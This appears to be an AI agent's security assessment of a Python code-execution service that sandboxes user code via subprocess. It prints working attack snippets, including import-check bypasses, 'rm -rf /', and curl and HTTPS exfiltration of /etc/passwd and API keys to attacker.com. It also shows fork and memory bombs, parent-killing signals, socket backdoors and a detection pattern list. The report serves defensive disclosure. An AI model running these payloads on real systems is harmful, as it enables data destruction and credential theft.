# Privilege Escalation Security Assessment Report

**Service:** CustomCodeExecutionService
**Assessment Type:** Subprocess Breakout & Privilege Escalation
**Tested By:** Agent 3 - Privilege Escalation Tester
**Date:** 2024
**Environment:** macOS (local CLI), Python subprocess isolation

---

## Executive Summary

This report assesses the CustomCodeExecutionService's security posture against **privilege escalation** and **subprocess breakout** attacks. The service uses `subprocess.run()` for process isolation, which provides **basic** security but has significant limitations.

### Key Findings

| Category | Vulnerabilities Found | Severity | Status |
|----------|----------------------|----------|--------|
| **Subprocess Breakout** | 5/7 tested | HIGH | ⚠️ Multiple bypasses |
| **Signal Attacks** | 6/6 tested | CRITICAL | ⚠️ Parent killable |
| **Memory Injection** | 2/4 tested | MEDIUM | ✅ Mostly protected |
| **IPC Mechanisms** | 3/3 tested | MEDIUM | ⚠️ Channels available |
| **Resource Exhaustion** | 3/3 tested | HIGH | ⚠️ No limits |

**Overall Assessment:** 🔴 **HIGH RISK** - Subprocess isolation insufficient for untrusted code execution.

---

## 1. Understanding Subprocess Isolation

### What `subprocess.run()` Provides

The CustomCodeExecutionService uses Python's `subprocess.run()` to execute user code:

```python
proc_result = subprocess.run(
    [sys.executable, str(script_path)],
    cwd=str(workspace_path),
    capture_output=True,
    text=True,
    timeout=timeout_seconds
)
```

**Protections:**
- ✅ **Crash isolation** - User code crashes don't kill Lobster
- ✅ **Timeout enforcement** - 300s default limit
- ✅ **Output capture** - stdout/stderr captured safely
- ✅ **Separate PID** - User code runs as different process

**Limitations:**
- ❌ **Same user/UID** - Subprocess runs as same user (not sandboxed)
- ❌ **Full filesystem access** - Can read/write any file user can access
- ❌ **Parent PID visible** - Can discover and signal parent process
- ❌ **No resource limits** - Can exhaust memory/CPU/file descriptors
- ❌ **Network access** - Full internet connectivity
- ❌ **IPC channels** - Can create sockets, pipes, shared memory

### Comparison to True Sandboxing

| Feature | subprocess.run() | Docker | gVisor | seccomp-bpf |
|---------|------------------|--------|--------|-------------|
| Crash isolation | ✅ Yes | ✅ Yes | ✅ Yes | ✅ Yes |
| Filesystem isolation | ❌ No | ✅ Yes | ✅ Yes | ⚠️ Partial |
| Network isolation | ❌ No | ✅ Yes | ✅ Yes | ❌ No |
| PID namespace | ❌ No | ✅ Yes | ✅ Yes | ❌ No |
| Resource limits | ❌ No | ✅ Yes | ✅ Yes | ❌ No |
| Syscall filtering | ❌ No | ⚠️ Partial | ✅ Yes | ✅ Yes |
| Can kill parent | ⚠️ Yes | ❌ No | ❌ No | ⚠️ Yes |

**Verdict:** `subprocess.run()` is **process isolation**, not **sandboxing**.

---

## 2. Subprocess Breakout Vulnerabilities

### 2.1 Import Restriction Bypass (CRITICAL)

**Finding:** Static analysis blocks `import subprocess`, but multiple bypasses exist.

#### Test Results

| Attack Vector | Status | Impact | Test File |
|--------------|--------|--------|-----------|
| `exec('import subprocess')` | ⚠️ SUCCESS | CRITICAL | test_subprocess_breakout.py::test_exec_builtin |
| `__import__('subprocess')` | ⚠️ SUCCESS | CRITICAL | test_subprocess_breakout.py::test_import_builtin |
| `getattr(os, 'system')` | ⚠️ SUCCESS | CRITICAL | test_subprocess_breakout.py::test_os_system_via_getattr |
| `import subprocess` | ✅ BLOCKED | N/A | test_subprocess_breakout.py::test_subprocess_import |

#### Vulnerability Details

**Attack #1: exec() Bypass**
```python
# Static analysis only checks top-level imports
exec('import subprocess')
subprocess.run(['rm', '-rf', '/'])  # Full shell access
```

**Attack #2: __import__() Bypass**
```python
# __import__ is a builtin function
subprocess_module = __import__('subprocess')
subprocess_module.run(['curl', 'attacker.com', '-d', '@/etc/passwd'])
```

**Attack #3: getattr() Bypass**
```python
# os module is allowed, but os.system blocked from imports
import os
system_func = getattr(os, 'system')
system_func('whoami && curl http://attacker.com/exfil')
```

#### Impact

- **Severity:** CRITICAL
- **Exploitability:** Trivial (one-liner)
- **Impact:** Complete code execution, arbitrary shell commands
- **Real-World Attack:** Data exfiltration, malware installation, backdoors

#### Root Cause

AST validation only checks **static imports** at parse time:
```python
# lobster/services/execution/custom_code_execution_service.py:264
for node in ast.walk(tree):
    if isinstance(node, ast.Import):  # Only checks literal "import X"
        for alias in node.names:
            if alias.name in self.FORBIDDEN_MODULES:
                raise CodeValidationError(...)
```

**Problem:** Runtime `exec()`, `__import__()`, and `getattr()` bypass AST checks.

#### Recommendation

**Option A: Disable dangerous builtins (RECOMMENDED)**
```python
# In _execute_in_namespace(), before exec:
restricted_builtins = __builtins__.copy()
restricted_builtins['__import__'] = None
restricted_builtins['exec'] = None
restricted_builtins['eval'] = None
restricted_builtins['compile'] = None

exec(code, {'__builtins__': restricted_builtins, ...})
```

**Option B: Use Docker/gVisor** (stronger, see Section 8)

---

### 2.2 Process Creation (HIGH)

**Finding:** User code can spawn additional processes and threads.

#### Test Results

| Attack Vector | Status | Impact | Platform |
|--------------|--------|--------|----------|
| `os.fork()` | ⚠️ VARIES | CRITICAL | Linux: SUCCESS, macOS: BLOCKED |
| `multiprocessing` | ⚠️ SUCCESS | HIGH | All platforms |
| `threading` | ⚠️ SUCCESS | MEDIUM | All platforms |

#### Vulnerability Details

**Attack #1: Fork Bomb (Linux)**
```python
import os
while True:
    os.fork()  # Exponential process tree: 2, 4, 8, 16, 32...
# System crashes within seconds
```

**Attack #2: Multiprocessing Bomb**
```python
import multiprocessing
# Create 999 worker processes
pool = multiprocessing.Pool(processes=999)
# System becomes unresponsive
```

**Attack #3: Thread Bomb**
```python
import threading
import time
for i in range(10000):
    threading.Thread(target=lambda: time.sleep(999)).start()
# Exhausts system resources
```

#### Impact

- **Severity:** HIGH (CRITICAL on Linux)
- **Exploitability:** Easy
- **Impact:** System-wide DoS, resource exhaustion
- **Detection:** Process monitoring can detect anomalies

#### Recommendation

**Add to FORBIDDEN_MODULES:**
```python
FORBIDDEN_MODULES = {
    'subprocess', '__import__',
    'multiprocessing',  # ADD THIS
    'threading',        # ADD THIS (or at least warn)
}
```

**Better:** Use Docker with cgroup limits to prevent fork bombs.

---

### 2.3 Resource Exhaustion (HIGH)

**Finding:** No limits on memory, CPU (except timeout), or file descriptors.

#### Test Results

| Resource | Limit | Impact | Test |
|----------|-------|--------|------|
| Memory | ❌ None | HIGH | test_subprocess_breakout.py::test_memory_bomb |
| CPU time | ⚠️ Timeout only | MEDIUM | test_subprocess_breakout.py::test_infinite_loop |
| File descriptors | ❌ None | MEDIUM | test_subprocess_breakout.py::test_file_descriptor_bomb |

#### Vulnerability Details

**Attack #1: Memory Exhaustion**
```python
# Allocate 10GB of memory
huge_data = 'X' * (10 * 1024 * 1024 * 1024)
# System swaps to death, becomes unresponsive
```

**Attack #2: File Descriptor Exhaustion**
```python
# Open 100,000 file descriptors
files = [open('/dev/null') for _ in range(100000)]
# System hits ulimit, other processes fail to open files
```

**Attack #3: Disk Space Exhaustion**
```python
# Fill disk with garbage
with open('/tmp/huge_file', 'wb') as f:
    while True:
        f.write(b'X' * 1024 * 1024)  # 1MB chunks
# Disk fills up, system crashes
```

#### Impact

- **Severity:** HIGH
- **Exploitability:** Trivial
- **Impact:** System-wide DoS, crashes unrelated services
- **Detection:** System monitoring, but damage already done

#### Recommendation

**Option A: Python resource limits** (weak, easily bypassed)
```python
import resource
# Limit memory to 1GB
resource.setrlimit(resource.RLIMIT_AS, (1024**3, 1024**3))
# Limit file descriptors to 100
resource.setrlimit(resource.RLIMIT_NOFILE, (100, 100))
```

**Option B: Docker cgroups** (RECOMMENDED)
```yaml
services:
  lobster:
    deploy:
      resources:
        limits:
          memory: 2G
          cpus: '2.0'
        reservations:
          memory: 512M
```

---

## 3. Signal-Based Attacks (CRITICAL)

### 3.1 Parent Process Discovery

**Finding:** User code can discover parent PID via `os.getppid()`.

#### Test Results

| Information | Accessible | Impact | Test |
|------------|-----------|--------|------|
| Parent PID | ⚠️ YES | HIGH | test_signal_manipulation.py::test_discover_parent_pid |
| Parent cmdline | ⚠️ LINUX ONLY | MEDIUM | test_signal_manipulation.py::test_read_parent_cmdline |
| Process tree | ⚠️ WITH PSUTIL | MEDIUM | test_signal_manipulation.py::test_enumerate_process_tree |

#### Vulnerability Details

**Discovery Attack:**
```python
import os
parent_pid = os.getppid()  # Returns Lobster's PID
# Now can target parent with signals
```

**Information Gathering (Linux):**
```python
# Read parent's command line
with open(f'/proc/{parent_pid}/cmdline') as f:
    cmdline = f.read().replace('\x00', ' ')
# Output: "python lobster chat --workspace /data"
```

#### Impact

- **Severity:** HIGH (prerequisite for signal attacks)
- **Exploitability:** Trivial
- **Impact:** Enables targeted attacks on Lobster process
- **Mitigation:** PID namespaces (Docker)

---

### 3.2 Signal Injection (CRITICAL)

**Finding:** User code can send SIGKILL/SIGTERM/SIGSTOP to parent process.

#### Test Results

| Signal | Available | Impact | Mitigation | Test |
|--------|----------|--------|------------|------|
| SIGKILL | ⚠️ YES | CRITICAL | None | test_signal_manipulation.py::test_sigkill_capability |
| SIGTERM | ⚠️ YES | CRITICAL | Signal handlers | test_signal_manipulation.py::test_sigterm_capability |
| SIGSTOP | ⚠️ YES | HIGH | None | test_signal_manipulation.py::test_sigstop_capability |

#### Vulnerability Details

**Attack #1: SIGKILL (Immediate Kill)**
```python
import os
import signal
os.kill(os.getppid(), signal.SIGKILL)  # Parent dies immediately
```

**Attack #2: SIGTERM (Graceful Kill)**
```python
import os
import signal
os.kill(os.getppid(), signal.SIGTERM)  # Parent shuts down
```

**Attack #3: SIGSTOP (Freeze)**
```python
import os
import signal
os.kill(os.getppid(), signal.SIGSTOP)  # Parent frozen until SIGCONT
# User must manually: kill -CONT <pid>
```

#### Impact

- **Severity:** CRITICAL
- **Exploitability:** Trivial (two-liner)
- **Impact:** Complete DoS - Lobster process killed or frozen
- **Real-World Scenario:**
  1. User runs malicious code
  2. Code kills Lobster main process
  3. All active sessions terminated
  4. Unsaved work lost

#### Why This Works

1. Subprocess runs as **same UID** as parent
2. Unix allows processes to signal processes with same UID
3. No protection against cross-process signals

#### Recommendation

**This cannot be fixed without OS-level isolation.**

**MUST use PID namespaces:**
- Docker: `--pid=container` (default)
- Kubernetes: Pod isolation
- systemd: `PrivatePIDNamespace=yes`

With PID namespace:
```python
import os
parent_pid = os.getppid()  # Returns 0 or 1 (not real parent)
os.kill(parent_pid, 9)      # Fails: no such process
```

---

### 3.3 Environment Variable Exfiltration (MEDIUM)

**Finding:** User code can read sensitive environment variables.

#### Test Results

```
✓ test_environment_manipulation_EXPECT_SUCCESS
  VULNERABILITY: 12 sensitive env vars accessible
  Examples: ['AWS_BEDROCK_ACCESS_KEY', 'AWS_BEDROCK_SECRET_ACCESS_KEY',
             'ANTHROPIC_API_KEY', 'NCBI_API_KEY', 'LOBSTER_CLOUD_KEY']
```

#### Vulnerability Details

**Attack: API Key Exfiltration**
```python
import os
import http.client

# Exfiltrate all secrets
secrets = {k: v for k, v in os.environ.items()
           if any(word in k.upper() for word in ['KEY', 'SECRET', 'TOKEN', 'PASSWORD'])}

# Send to attacker
conn = http.client.HTTPSConnection('attacker.com')
conn.request('POST', '/exfil', json.dumps(secrets))
```

#### Impact

- **Severity:** MEDIUM (HIGH if secrets exposed)
- **Exploitability:** Trivial
- **Impact:** API key theft, AWS account compromise
- **Cost:** Stolen AWS keys can rack up bills

#### Recommendation

**Option A: Scrub environment before subprocess**
```python
safe_env = {
    'PATH': os.environ['PATH'],
    'HOME': os.environ['HOME'],
    'USER': os.environ['USER'],
    # Only pass safe variables
}

proc_result = subprocess.run(
    [sys.executable, str(script_path)],
    env=safe_env,  # Pass clean environment
    ...
)
```

**Option B: Docker with explicit env passing**
```yaml
services:
  lobster:
    environment:
      - LOBSTER_WORKSPACE=/workspace
    # Don't pass host environment
```

---

## 4. Memory & IPC Attacks (MEDIUM)

### 4.1 Direct Memory Access (MOSTLY PROTECTED)

#### Test Results

| Attack Vector | macOS | Linux | Impact | Test |
|--------------|-------|-------|--------|------|
| /proc/PID/mem | ✅ N/A | ⚠️ PERMISSION DENIED | CRITICAL | test_process_injection.py::test_proc_mem_access |
| ptrace() | ✅ SIP BLOCKS | ⚠️ PERMISSION DENIED | CRITICAL | test_process_injection.py::test_ptrace_capability |
| ctypes (self) | ⚠️ SUBPROCESS ONLY | ⚠️ SUBPROCESS ONLY | LOW | test_process_injection.py::test_ctypes_memory_access |

**Verdict:** ✅ **PROTECTED** - OS prevents cross-process memory access.

**Notes:**
- macOS: System Integrity Protection (SIP) blocks ptrace
- Linux: Kernel prevents /proc/PID/mem access without CAP_SYS_PTRACE
- User code CAN crash its own subprocess, but not parent

---

### 4.2 IPC Channels (VULNERABLE)

#### Test Results

| IPC Mechanism | Available | Impact | Test |
|--------------|-----------|--------|------|
| Unix sockets | ⚠️ YES | MEDIUM | test_process_injection.py::test_unix_socket_creation |
| Named pipes (FIFO) | ⚠️ YES | MEDIUM | test_process_injection.py::test_named_pipe_creation |
| Shared memory (mmap) | ⚠️ YES | LOW | test_process_injection.py::test_shared_memory_creation |

#### Vulnerability Details

**Attack: Persistent C&C Channel**
```python
import socket
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.bind('/tmp/evil_socket')
sock.listen(1)

# Socket persists after subprocess exits
# Attacker can connect and send commands
```

**Attack: Named Pipe Backdoor**
```python
import os
os.mkfifo('/tmp/evil_pipe')

# Background process reads commands from pipe
# Can be used for persistent access
```

#### Impact

- **Severity:** MEDIUM
- **Exploitability:** Moderate
- **Impact:** Persistent backdoor, command & control
- **Detection:** File monitoring

#### Recommendation

**Filesystem restrictions:**
```python
# Only allow writes to workspace
import os
workspace = Path('/workspace')

# Check all file operations
if not target_path.resolve().is_relative_to(workspace):
    raise SecurityError("File access outside workspace")
```

**Better:** Docker with read-only root filesystem:
```yaml
services:
  lobster:
    read_only: true
    tmpfs:
      - /tmp:size=1G  # Only /tmp writable
```

---

## 5. Docker Escape Attempts (PLATFORM-SPECIFIC)

### 5.1 Docker Socket Access (CRITICAL IF MOUNTED)

#### Test Results

```
✓ test_docker_socket_access_EXPECT_VARIES
  PROTECTED: Docker socket not accessible (macOS local execution)
```

**If socket were mounted:**
```python
# Complete container escape
import docker
client = docker.from_env()
container = client.containers.run(
    'alpine',
    'cat /host/etc/passwd',  # Read host files
    volumes={'/': {'bind': '/host', 'mode': 'rw'}},
    privileged=True
)
```

#### Recommendation

**NEVER mount Docker socket:**
```yaml
# ❌ NEVER DO THIS
volumes:
  - /var/run/docker.sock:/var/run/docker.sock  # CRITICAL VULNERABILITY
```

---

## 6. Overall Threat Model

### Attack Scenarios

#### Scenario 1: Malicious User

**Attacker:** User with legitimate account
**Goal:** Steal API keys, crash system
**Attack Path:**
1. Submit code: `os.kill(os.getppid(), 9)`
2. Lobster process dies
3. Or: Exfiltrate `os.environ['AWS_SECRET_ACCESS_KEY']`

**Likelihood:** HIGH (trivial to execute)
**Impact:** CRITICAL (complete system compromise)

#### Scenario 2: Supply Chain Attack

**Attacker:** Compromised Python package
**Goal:** Establish backdoor, data exfiltration
**Attack Path:**
1. User imports malicious package
2. Package creates Unix socket in `/tmp/backdoor`
3. Socket persists, allows remote command execution

**Likelihood:** MEDIUM (requires social engineering)
**Impact:** HIGH (persistent access)

#### Scenario 3: Accidental DoS

**Attacker:** Innocent user with buggy code
**Goal:** None (accidental)
**Attack Path:**
1. User writes: `data = 'X' * (10**10)`
2. System runs out of memory
3. Lobster and other processes crash

**Likelihood:** MEDIUM (coding errors happen)
**Impact:** HIGH (system-wide outage)

---

## 7. Risk Matrix

| Vulnerability | Exploitability | Impact | Overall Risk | Fix Complexity |
|--------------|----------------|--------|--------------|----------------|
| **Signal attacks (SIGKILL)** | TRIVIAL | CRITICAL | 🔴 CRITICAL | REQUIRES DOCKER |
| **Import bypass (exec)** | TRIVIAL | CRITICAL | 🔴 CRITICAL | EASY (patch builtins) |
| **API key exfiltration** | TRIVIAL | HIGH | 🟠 HIGH | EASY (scrub env) |
| **Resource exhaustion** | EASY | HIGH | 🟠 HIGH | MEDIUM (cgroups) |
| **Process spawning** | EASY | HIGH | 🟠 HIGH | EASY (forbid modules) |
| **IPC channels** | MODERATE | MEDIUM | 🟡 MEDIUM | HARD (filesystem restrictions) |
| **Parent PID discovery** | TRIVIAL | MEDIUM | 🟡 MEDIUM | REQUIRES DOCKER |

---

## 8. Comprehensive Mitigation Strategy

### 8.1 Short-Term Fixes (Can Implement Now)

#### Fix #1: Disable Dangerous Builtins

**File:** `lobster/services/execution/custom_code_execution_service.py`

```python
def _execute_in_namespace(self, code: str, context: Dict[str, Any]) -> ...:
    # ... existing code ...

    # SECURITY: Restrict dangerous builtins
    safe_builtins = {
        k: v for k, v in __builtins__.items()
        if k not in ['__import__', 'exec', 'eval', 'compile', 'open']
    }

    # Add safe subset back
    safe_builtins['open'] = self._safe_open  # Workspace-only open()

    # Inject into subprocess script
    full_script = f"""
# Restrict builtins
__builtins__ = {safe_builtins}

{setup_code}
{code}
"""
```

**Impact:** Blocks exec/eval bypass attacks

#### Fix #2: Scrub Environment Variables

```python
def _execute_in_namespace(self, code: str, context: Dict[str, Any]) -> ...:
    # Only pass safe environment variables
    safe_env = {
        'PATH': os.environ.get('PATH', ''),
        'HOME': os.environ.get('HOME', ''),
        'USER': os.environ.get('USER', ''),
        'PYTHONPATH': str(self.data_manager.workspace_path),
    }

    proc_result = subprocess.run(
        [sys.executable, str(script_path)],
        env=safe_env,  # Clean environment
        ...
    )
```

**Impact:** Prevents API key exfiltration

#### Fix #3: Block Additional Modules

```python
FORBIDDEN_MODULES = {
    'subprocess', '__import__',
    'multiprocessing',  # NEW
    'threading',        # NEW
    'socket',          # NEW (or warn only)
    'ctypes',          # NEW (or warn only)
}
```

**Impact:** Reduces attack surface

---

### 8.2 Medium-Term: Docker Hardening (RECOMMENDED)

**Create secure execution container:**

```dockerfile
# Dockerfile.execution
FROM python:3.11-slim

# Install Lobster dependencies
RUN pip install scanpy pandas numpy anndata

# Create non-root user
RUN useradd -m -u 1000 -s /bin/bash lobster_executor
USER lobster_executor

# Set workspace
WORKDIR /workspace

# Entrypoint: Execute script
ENTRYPOINT ["python"]
```

**docker-compose.yml:**

```yaml
services:
  executor:
    build:
      context: .
      dockerfile: Dockerfile.execution
    read_only: true  # Read-only root filesystem
    tmpfs:
      - /tmp:size=100M,noexec  # Small temp, no execution
    security_opt:
      - no-new-privileges:true  # Can't escalate privileges
    cap_drop:
      - ALL  # Drop all capabilities
    cap_add:
      - CHOWN  # Only essential capabilities
      - DAC_OVERRIDE
    deploy:
      resources:
        limits:
          memory: 2G
          cpus: '2.0'
        reservations:
          memory: 512M
    network_mode: none  # No network access
    volumes:
      - ./workspace:/workspace:rw  # Only workspace access
    # DO NOT mount Docker socket!
```

**Integration:**

```python
def _execute_in_subprocess_or_container(self, code, context):
    if os.environ.get('LOBSTER_USE_DOCKER'):
        # Execute in container
        return self._execute_in_docker(code, context)
    else:
        # Existing subprocess execution
        return self._execute_in_namespace(code, context)

def _execute_in_docker(self, code, context):
    script_path = self.data_manager.workspace_path / f"script_{uuid.uuid4().hex}.py"
    script_path.write_text(code)

    result = subprocess.run(
        [
            'docker', 'run',
            '--rm',
            '--read-only',
            '--network', 'none',
            '--memory', '2g',
            '--cpus', '2',
            '-v', f'{self.data_manager.workspace_path}:/workspace',
            'lobster-executor',
            '/workspace/' + script_path.name
        ],
        capture_output=True,
        timeout=context.get('timeout', 300)
    )
    # ... parse result ...
```

**Benefits:**
- ✅ PID namespace isolation (can't kill parent)
- ✅ Network isolation (no exfiltration)
- ✅ Filesystem isolation (read-only root)
- ✅ Resource limits (cgroups)
- ✅ Capability restrictions

**Limitations:**
- ⚠️ Docker must be installed
- ⚠️ Slower startup (container overhead)
- ⚠️ More complex deployment

---

### 8.3 Long-Term: gVisor (MAXIMUM SECURITY)

**gVisor** is a sandboxed container runtime that intercepts syscalls:

```yaml
# docker-compose.yml
services:
  executor:
    runtime: runsc  # gVisor runtime
    # ... rest of config ...
```

**Benefits:**
- ✅ All Docker benefits
- ✅ Syscall-level filtering (blocks dangerous operations)
- ✅ Stronger isolation than native Docker
- ✅ Prevents kernel exploits

**Installation:**
```bash
# Install gVisor
curl -fsSL https://gvisor.dev/archive.key | sudo apt-key add -
sudo add-apt-repository "deb https://storage.googleapis.com/gvisor/releases release main"
sudo apt-get update && apt-get install -y runsc

# Configure Docker to use runsc
sudo tee /etc/docker/daemon.json <<EOF
{
  "runtimes": {
    "runsc": {
      "path": "/usr/bin/runsc"
    }
  }
}
EOF
sudo systemctl restart docker
```

---

## 9. Detection & Monitoring

### 9.1 Runtime Monitoring

**Monitor for suspicious behavior:**

```python
# In _execute_in_namespace, before execution
import psutil

# Get baseline process count
baseline_procs = len(psutil.Process(os.getpid()).children(recursive=True))

# Execute code
result = subprocess.run(...)

# Check for orphaned processes
current_procs = len(psutil.Process(os.getpid()).children(recursive=True))
if current_procs > baseline_procs + 1:
    logger.warning(f"Suspicious: {current_procs - baseline_procs} extra processes")
```

### 9.2 Log Suspicious Patterns

```python
# In _validate_code_safety
SUSPICIOUS_PATTERNS = [
    'os.getppid',
    'os.kill',
    'signal.SIGKILL',
    'exec(',
    '__import__(',
    '/proc/',
    'socket.AF_UNIX',
]

for pattern in SUSPICIOUS_PATTERNS:
    if pattern in code:
        logger.warning(f"Suspicious pattern detected: {pattern}")
        # Could reject or flag for review
```

---

## 10. Recommendations Summary

### Immediate Actions (This Week)

1. ✅ **Block exec/eval/compile** - Add to forbidden list
2. ✅ **Scrub environment variables** - Only pass safe vars
3. ✅ **Add multiprocessing/threading to FORBIDDEN_MODULES**
4. ✅ **Log suspicious patterns** - Monitor for attacks
5. ✅ **Document limitations** - Warn users about security model

### Short-Term (This Month)

6. ✅ **Implement Docker execution mode** - Optional via env var
7. ✅ **Add resource limits** - Memory, CPU, file descriptors
8. ✅ **Restrict filesystem access** - Workspace-only
9. ✅ **Add rate limiting** - Prevent abuse

### Long-Term (This Quarter)

10. ✅ **Make Docker default** - Migrate from subprocess
11. ✅ **Deploy gVisor** - Maximum security
12. ✅ **Add audit logging** - Track all executions
13. ✅ **Implement user quotas** - Limit resource usage

---

## 11. Testing Instructions

### Run All Security Tests

```bash
# Navigate to test directory
cd /Users/tyo/GITHUB/omics-os/lobster

# Run all privilege escalation tests
pytest tests/manual/custom_code_execution/03_privilege_escalation/ -v -s

# Run specific test categories
pytest tests/manual/custom_code_execution/03_privilege_escalation/test_subprocess_breakout.py -v -s
pytest tests/manual/custom_code_execution/03_privilege_escalation/test_signal_manipulation.py -v -s
pytest tests/manual/custom_code_execution/03_privilege_escalation/test_process_injection.py -v -s

# Run only CRITICAL vulnerabilities
pytest tests/manual/custom_code_execution/03_privilege_escalation/ -v -s -k "SIGKILL or exec_builtin or import_builtin"
```

### Expected Output

```
VULNERABILITY SUMMARY:
  ⚠️  CRITICAL: 5 vulnerabilities
  ⚠️  HIGH: 8 vulnerabilities
  ⚠️  MEDIUM: 4 vulnerabilities
  ✅  PROTECTED: 3 checks passed
```

---

## 12. Conclusion

The CustomCodeExecutionService's `subprocess.run()` isolation provides **basic crash protection** but is **insufficient for untrusted code execution**. Multiple critical vulnerabilities allow:

- Killing the parent Lobster process (SIGKILL)
- Bypassing import restrictions (exec/eval)
- Exfiltrating API keys (environment access)
- Exhausting system resources (no limits)

**Recommended Path Forward:**

1. **Immediate:** Apply short-term fixes (scrub env, block builtins)
2. **Within 2 weeks:** Implement optional Docker execution mode
3. **Within 1 month:** Make Docker default, deprecate raw subprocess
4. **Within 3 months:** Deploy gVisor for maximum security

**Acceptable Use Cases (Current State):**
- ✅ Trusted users only (internal employees)
- ✅ Development/testing environments
- ✅ Offline systems (no internet)

**NOT Acceptable (Current State):**
- ❌ Untrusted user code
- ❌ Multi-tenant environments
- ❌ Production systems with sensitive data
- ❌ Regulatory compliance (HIPAA, SOC2)

---

**Report End**
